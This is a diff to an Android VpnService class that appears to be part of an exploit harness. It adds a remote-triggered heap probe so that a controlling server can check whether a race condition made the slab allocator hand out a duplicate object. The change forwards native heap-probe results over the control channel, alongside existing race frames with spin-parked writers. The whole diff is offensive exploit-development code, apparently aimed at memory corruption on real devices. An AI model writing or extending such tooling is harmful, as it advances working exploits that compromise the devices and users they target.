@@ -92,6 +92,16 @@ public class InjService extends VpnService {
     private static final int DUAL_MARK = 0xFFFFFFFE;
 
     /**
+     * Frame marker that asks for a heap probe and answers with a byte string.
+     *
+     * The server drives the race from outside, so it also has to be the one
+     * deciding when to look at the slab. Interleaving probe frames between
+     * rounds is what turns "did the race hit" into an observation instead of
+     * an inference from unrelated counters.
+     */
+    private static final int PROBE_MARK = 0xFFFFFFFD;
+
+    /**
      * How many spin-parked writers participate in a race frame.
      *
      * Two was the minimum the race can work with, but it is fragile: the pair
@@ -248,6 +258,16 @@ public class InjService extends VpnService {
                         | ((lengthField[1] & 0xff) << 16)
                         | ((lengthField[2] & 0xff) << 8)
                         | (lengthField[3] & 0xff);
+
+                if (length == PROBE_MARK) {
+                    byte[] cnt = new byte[2];
+                    if (!readFully(frame, cnt, 2)) {
+                        break;
+                    }
+                    int want = ((cnt[0] & 0xff) << 8) | (cnt[1] & 0xff);
+                    answerProbe(out, want);
+                    continue;
+                }
 
                 if (length == DUAL_MARK) {
                     if (!readDualPair(frame, lengthField)) {
@@ -410,6 +430,42 @@ public class InjService extends VpnService {
         synchronized (out) {
             out.write(ACK_BYTE);
             out.flush();
+        }
+    }
+
+    /**
+     * Run a heap probe and ship the result back on the control channel.
+     *
+     * The reply uses the same 0x07 frame the tun drain uses, so the server can
+     * read it with the parser it already has. Text is carried as-is; anything
+     * that can answer "did the slab hand out a duplicate" is worth the few
+     * extra bytes.
+     */
+    private void answerProbe(OutputStream out, int count) {
+        String result;
+        try {
+            result = Native.probeHeap(count);
+        } catch (Throwable t) {
+            result = "probe error: " + t;
+        }
+
+        Log.i(TAG, "probe count=" + count + " -> " + result);
+
+        try {
+            byte[] payload = result.getBytes("UTF-8");
+            byte[] len = new byte[4];
+            len[0] = (byte) ((payload.length >> 24) & 0xff);
+            len[1] = (byte) ((payload.length >> 16) & 0xff);
+            len[2] = (byte) ((payload.length >> 8) & 0xff);
+            len[3] = (byte) (payload.length & 0xff);
+            synchronized (out) {
+                out.write(OUT_BYTE);
+                out.write(len);
+                out.write(payload);
+                out.flush();
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "probe reply failed: " + e);
         }
     }
 
